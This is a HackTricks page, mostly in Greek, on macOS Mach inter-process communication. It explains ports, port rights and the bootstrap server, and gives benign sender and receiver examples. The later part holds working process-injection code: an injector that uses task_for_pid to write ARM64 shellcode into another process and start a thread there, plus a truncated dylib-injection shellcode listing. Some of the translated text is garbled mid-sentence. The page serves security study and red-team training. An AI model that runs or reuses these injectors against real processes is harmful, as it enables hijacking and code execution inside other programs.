# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Το Mach χρησιμοποιεί **tasks** ως την **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε task μπορεί να περιέχει **πολλές νήματα**. Αυτές οι **tasks και νήματα αντιστοιχούν 1:1 σε διαδικασίες και νήματα POSIX**.

Η επικοινωνία μεταξύ των tasks συμβαίνει μέσω της Mach Inter-Process Communication (IPC), χρησιμοποιώντας κανάλια επικοινωνίας ενός μόνο τρόπου. **Μηνύματα μεταφέρονται μεταξύ θυρών**, οι οποίες λειτουργούν ως **ουρές μηνυμάτων** που διαχειρίζεται ο πυρήνας.

Κάθε διαδικασία έχει έναν **πίνακα IPC**, όπου είναι δυνατή η εύρεση των **mach ports της διαδικασίας**. Το όνομα μιας mach port είναι στην πραγματικότητα ένας αριθμός (ένας δείκτης στο αντικείμενο του πυρήνα).

Μια διαδικασία μπορεί επίσης να στείλει ένα όνομα port με ορισμένα δικαιώματα **σε μια διαφορετική task** και ο πυρήνας θα κάνει αυτή την καταχώρηση στον **πίνακα IPC της άλλης task**.

### Port Rights

Τα δικαιώματα port, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει μια task, είναι κλειδί για αυτή την επικοινωνία. Τα πιθανά **δικαιώματα port** είναι ([ορισμοί από εδώ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Δικαίωμα λήψης**, το οποίο επιτρέπει τη λήψη μηνυμάτων που αποστέλλονται στην port. Οι Mach ports είναι MPSC (πολλοί παραγωγοί, ένας καταναλωτής) ουρές, που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα δικαίωμα λήψης για κάθε port** σε ολόκληρο το σύστημα (σε αντίθεση με τους σωλήνες, όπου πολλές διαδικασίες μπορούν να κατέχουν περιγραφές αρχείων στο αναγνωστικό άκρο ενός σωλήνα).
* Μια **task με το Δικαίωμα Λήψης** μπορεί να λαμβάνει μηνύματα και **να δημιουργεί Δικαιώματα Αποστολής**, επιτρέποντάς της να στέλνει μηνύματα. Αρχικά μόνο η **δική της task έχει Δικαίωμα Λήψης πάνω στην port**.
* **Δικαίωμα αποστολής**, το οποίο επιτρέπει την αποστολή μηνυμάτων στην port.
* Το Δικαίωμα Αποστολής μπορεί να **κλωνοποιηθεί** έτσι ώστε μια task που κατέχει ένα Δικαίωμα Αποστολής να μπορεί να κλωνοποιήσει το δικαίωμα και **να το παραχωρήσει σε μια τρίτη task**.
* **Δικαίωμα αποστολής-μία φορά**, το οποίο επιτρέπει την αποστολή ενός μηνύματος στην port και στη συνέχεια εξαφανίζεται.
* **Δικαίωμα συνόλου θυρών**, το οποίο δηλώνει ένα _σύνολο θυρών_ αντί για μια μόνο port. Η αποδέσμευση ενός μηνύματος από ένα σύνολο θυρών αποδεσμεύει ένα μήνυμα από μία από τις θυρίδες που περιέχει. Τα σύνολα θυρών μπορούν να χρησιμοποιηθούν για να ακούσουν σε πολλές θυρίδες ταυτόχρονα, πολύ όπως το `select`/`poll`/`epoll`/`kqueue` στο Unix.
* **Νεκρό όνομα**, το οποίο δεν είναι πραγματικό δικαίωμα port, αλλά απλώς μια θέση κράτησης. Όταν μια port καταστραφεί, όλα τα υπάρχοντα δικαιώματα port στην port μετατρέπονται σε νεκρά ονόματα.

**Οι tasks μπορούν να μεταφέρουν ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ σε άλλους**, επιτρέποντάς τους να στέλνουν μηνύματα πίσω. **Τα ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ μπορούν επίσης να κλωνοποιηθούν, έτσι ώστε μια task να μπορεί να διπλασιάσει και να δώσει το δικαίωμα σε μια τρίτη task**. Αυτό, σε συνδυασμό με μια ενδιάμεση διαδικασία γνωστή ως **bootstrap server**, επιτρέπει αποτελεσματική επικοινωνία μεταξύ των tasks.

### File Ports

Οι File ports επιτρέπουν την ενσωμάτωση περιγραφών αρχείων σε Mac ports (χρησιμοποιώντας δικαιώματα Mach port). Είναι δυνατή η δημιουργία ενός `fileport` από μια δεδομένη FD χρησιμοποιώντας το `fileport_makeport` και η δημιουργία μιας FD από μια fileport χρησιμοποιώντας το `fileport_makefd`.

### Establishing a communication

#### Steps:

Όπως αναφέρθηκε, προκειμένου να καθιερωθεί το κανάλι επικοινωνίας, εμπλέκεται ο **bootstrap server** (**launchd** στο mac).

1. Η task **A** ξεκινά μια **νέα port**, αποκτώντας ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** στη διαδικασία.
2. Η task **A**, ως κάτοχος του Δικαιώματος Λήψης, **δημιουργεί ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ για την port**.
3. Η task **A** καθ establishes a **connection** με τον **bootstrap server**, παρέχοντας το **όνομα υπηρεσίας της port** και το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ** μέσω μιας διαδικασίας γνωστής ως bootstrap register.
4. Η task **B** αλληλεπιδρά με τον **bootstrap server** για να εκτελέσει μια bootstrap **lookup για το όνομα υπηρεσίας**. Εάν είναι επιτυχής, ο **server διπλασιάζει το ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ** που έλαβε από την Task A και **το μεταδίδει στην Task B**.
5. Με την απόκτηση ενός ΔΙΚΑΙΩΜΑΤΟΣ ΑΠΟΣΤΟΛΗΣ, η Task **B** είναι ικανή να **διαμορφώσει** ένα **μήνυμα** και να το αποστείλει **στην Task A**.
6. Για μια αμφίδρομη επικοινωνία, συνήθως η task **B** δημιουργεί μια νέα port με ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** και ένα **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ**, και δίνει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στην Task A** ώστε να μπορεί να στέλνει μηνύματα στην TASK B (αμφίδρομη επικοινωνία).

Ο bootstrap server **δεν μπορεί να πιστοποιήσει** το όνομα υπηρεσίας που δηλώνει μια task. Αυτό σημαίνει ότι μια **task** θα μπορούσε δυνητικά να **παριστάνει οποιαδήποτε συστημική task**, όπως ψευδώς **να δηλώνει ένα όνομα υπηρεσίας εξουσιοδότησης** και στη συνέχεια να εγκρίνει κάθε αίτημα.

Στη συνέχεια, η Apple αποθηκεύει τα **ονόματα υπηρεσιών που παρέχονται από το σύστημα** σε ασφαλή αρχεία ρυθμίσεων, που βρίσκονται σε **SIP-protected** καταλόγους: `/System/Library/LaunchDaemons` και `/System/Library/LaunchAgents`. Μαζί με κάθε όνομα υπηρεσίας, το **σχετικό δυαδικό αρχείο αποθηκεύεται επίσης**. Ο bootstrap server θα δημιουργήσει και θα διατηρήσει ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ για καθένα από αυτά τα ονόματα υπηρεσίας**.

Για αυτές τις προκαθορισμένες υπηρεσίες, η **διαδικασία αναζήτησης διαφέρει ελαφρώς**. Όταν ένα όνομα υπηρεσίας αναζητείται, το launchd ξεκινά την υπηρεσία δυναμικά. Η νέα ροή εργασίας είναι ως εξής:

* Η task **B** ξεκινά μια bootstrap **lookup** για ένα όνομα υπηρεσίας.
* **launchd** ελέγχει αν η task εκτελείται και αν δεν εκτελείται, **την ξεκινά**.
* Η task **A** (η υπηρεσία) εκτελεί μια **bootstrap check-in**. Εδώ, ο **bootstrap** server δημιουργεί ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ, το διατηρεί και **μεταφέρει το ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ στην Task A**.
* Ο launchd διπλασιάζει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ και το στέλνει στην Task B**.
* Η Task **B** δημιουργεί μια νέα port με ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** και ένα **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ**, και δίνει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στην Task A** (την svc) ώστε να μπορεί να στέλνει μηνύματα στην TASK B (αμφίδρομη επικοινωνία).

Ωστόσο, αυτή η διαδικασία ισχύει μόνο για προκαθορισμένες συστημικές tasks. Οι μη συστημικές tasks εξακολουθούν να λειτουργούν όπως περιγράφηκε αρχικά, γεγονός που θα μπορούσε δυνητικά να επιτρέψει την παρενόχληση.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Η συνάρτηση `mach_msg`, που είναι ουσιαστικά μια κλήση συστήματος, χρησιμοποιείται για την αποστολή και λήψη Mach μηνυμάτων. Η συνάρτηση απαιτεί το μήνυμα που θα σταλεί ως την αρχική παράμετρο. Αυτό το μήνυμα πρέπει να ξεκινά με μια δομή `mach_msg_header_t`, ακολουθούμενη από το πραγματικό περιεχόμενο του μηνύματος. Η δομή ορίζεται ως εξής:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Διεργασίες που κατέχουν ένα _**δικαίωμα λήψης**_ μπορούν να λαμβάνουν μηνύματα σε μια Mach θύρα. Αντίθετα, οι **αποστολείς** έχουν ένα _**δικαίωμα αποστολής**_ ή ένα _**δικαίωμα αποστολής-μία φορά**_. Το δικαίωμα αποστολής-μία φορά προορίζεται αποκλειστικά για την αποστολή ενός μόνο μηνύματος, μετά το οποίο καθίσταται άκυρο.

Για να επιτευχθεί μια εύκολη **διπλής κατεύθυνσης επικοινωνία**, μια διεργασία μπορεί να καθορίσει μια **mach θύρα** στην κεφαλίδα **μηνύματος** που ονομάζεται _θύρα απάντησης_ (**`msgh_local_port`**) όπου ο **δέκτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα. Οι σημαίες bitflags στο **`msgh_bits`** μπορούν να χρησιμοποιηθούν για να **υποδείξουν** ότι ένα **δικαίωμα αποστολής-μία φορά** θα πρέπει να παραχθεί και να μεταφερθεί για αυτή τη θύρα (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Σημειώστε ότι αυτός ο τύπος διπλής κατεύθυνσης επικοινωνίας χρησιμοποιείται σε μηνύματα XPC που αναμένουν μια απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Αλλά **συνήθως δημιουργούνται διαφορετικές θύρες** όπως εξηγήθηκε προηγουμένως για να δημιουργηθεί η διπλής κατεύθυνσης επικοινωνία.
{% endhint %}

Τα άλλα πεδία της κεφαλίδας μηνύματος είναι:

* `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
* `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: το ID αυτού του μηνύματος, το οποίο ερμηνεύεται από τον δέκτη.

{% hint style="danger" %}
Σημειώστε ότι **τα mach μηνύματα αποστέλλονται μέσω μιας \_mach θύρας**\_, η οποία είναι ένα **κανάλι επικοινωνίας με έναν μόνο δέκτη**, **πολλούς αποστολείς** που είναι ενσωματωμένο στον πυρήνα mach. **Πολλές διεργασίες** μπορούν να **στείλουν μηνύματα** σε μια mach θύρα, αλλά σε οποιαδήποτε στιγμή μόνο **μία διεργασία μπορεί να διαβάσει** από αυτήν.
{% endhint %}

### Καταμέτρηση θυρών
```bash
lsmp -p <pid>
```
Μπορείτε να εγκαταστήσετε αυτό το εργαλείο σε iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Σημειώστε πώς ο **αποστολέας** **κατανέμει** μια θύρα, δημιουργεί ένα **δικαίωμα αποστολής** για το όνομα `org.darlinghq.example` και το στέλνει στον **διακομιστή εκκίνησης** ενώ ο αποστολέας ζήτησε το **δικαίωμα αποστολής** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Privileged Ports

* **Host port**: Αν μια διαδικασία έχει **Send** δικαίωμα σε αυτή την θύρα μπορεί να αποκτήσει **πληροφορίες** για το **σύστημα** (π.χ. `host_processor_info`).
* **Host priv port**: Μια διαδικασία με **Send** δικαίωμα σε αυτή την θύρα μπορεί να εκτελέσει **προνομιακές ενέργειες** όπως η φόρτωση μιας επέκτασης πυρήνα. Η **διαδικασία πρέπει να είναι root** για να αποκτήσει αυτή την άδεια.
* Επιπλέον, για να καλέσετε το **`kext_request`** API απαιτείται να έχετε άλλες εξουσίες **`com.apple.private.kext*`** που δίνονται μόνο σε δυαδικά αρχεία της Apple.
* **Task name port:** Μια μη προνομιακή έκδοση της _task port_. Αναφέρεται στην εργασία, αλλά δεν επιτρέπει τον έλεγχο της. Το μόνο που φαίνεται να είναι διαθέσιμο μέσω αυτής είναι το `task_info()`.
* **Task port** (aka kernel port)**:** Με άδεια Send σε αυτή την θύρα είναι δυνατός ο έλεγχος της εργασίας (ανάγνωση/γραφή μνήμης, δημιουργία νημάτων...).
* Καλέστε το `mach_task_self()` για να **πάρετε το όνομα** για αυτή την θύρα για την καλούσα εργασία. Αυτή η θύρα είναι μόνο **κληρονομούμενη** μέσω **`exec()`**; μια νέα εργασία που δημιουργείται με `fork()` αποκτά μια νέα θύρα εργασίας (ως ειδική περίπτωση, μια εργασία αποκτά επίσης μια νέα θύρα εργασίας μετά το `exec()` σε ένα δυαδικό αρχείο suid). Ο μόνος τρόπος για να δημιουργήσετε μια εργασία και να αποκτήσετε την θύρα της είναι να εκτελέσετε τον ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) ενώ κάνετε ένα `fork()`.
* Αυτοί είναι οι περιορισμοί για την πρόσβαση στην θύρα (από `macos_task_policy` από το δυαδικό αρχείο `AppleMobileFileIntegrity`):
* Αν η εφαρμογή έχει **`com.apple.security.get-task-allow` entitlement** διαδικασίες από τον **ίδιο χρήστη μπορούν να αποκτήσουν πρόσβαση στην θύρα εργασίας** (συνήθως προστίθεται από το Xcode για αποσφαλμάτωση). Η διαδικασία **notarization** δεν θα το επιτρέψει σε παραγωγικές εκδόσεις.
* Εφαρμογές με την **`com.apple.system-task-ports`** εξουσία μπορούν να αποκτήσουν την **θύρα εργασίας για οποιαδήποτε** διαδικασία, εκτός από τον πυρήνα. Σε παλαιότερες εκδόσεις ονομαζόταν **`task_for_pid-allow`**. Αυτό χορηγείται μόνο σε εφαρμογές της Apple.
* **Ο root μπορεί να αποκτήσει πρόσβαση στις θύρες εργασίας** εφαρμογών **που δεν** έχουν μεταγλωττιστεί με **σκληρή** εκτέλεση (και όχι από την Apple).

### Shellcode Injection in thread via Task port

Μπορείτε να αποκτήσετε ένα shellcode από:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Συγκεντρώστε** το προηγούμενο πρόγραμμα και προσθέστε τα **entitlements** για να μπορείτε να εισάγετε κώδικα με τον ίδιο χρήστη (αν όχι, θα χρειαστεί να χρησιμοποιήσετε **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **δεν είναι συμβατό με posix**.

It was possible to **inject a simple shellcode** to execute a command because it **δεν χρειαζόταν να λειτουργεί με posix** compliant apis, only with Mach. **Πιο σύνθετες ενέσεις** would need the **thread** to be also **συμβατό με posix**.

Therefore, to **βελτιώσουμε το νήμα** it should call **`pthread_create_from_mach_thread`** which will **δημιουργήσει ένα έγκυρο pthread**. Then, this new pthread could **call dlopen** to **φορτώσει ένα dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
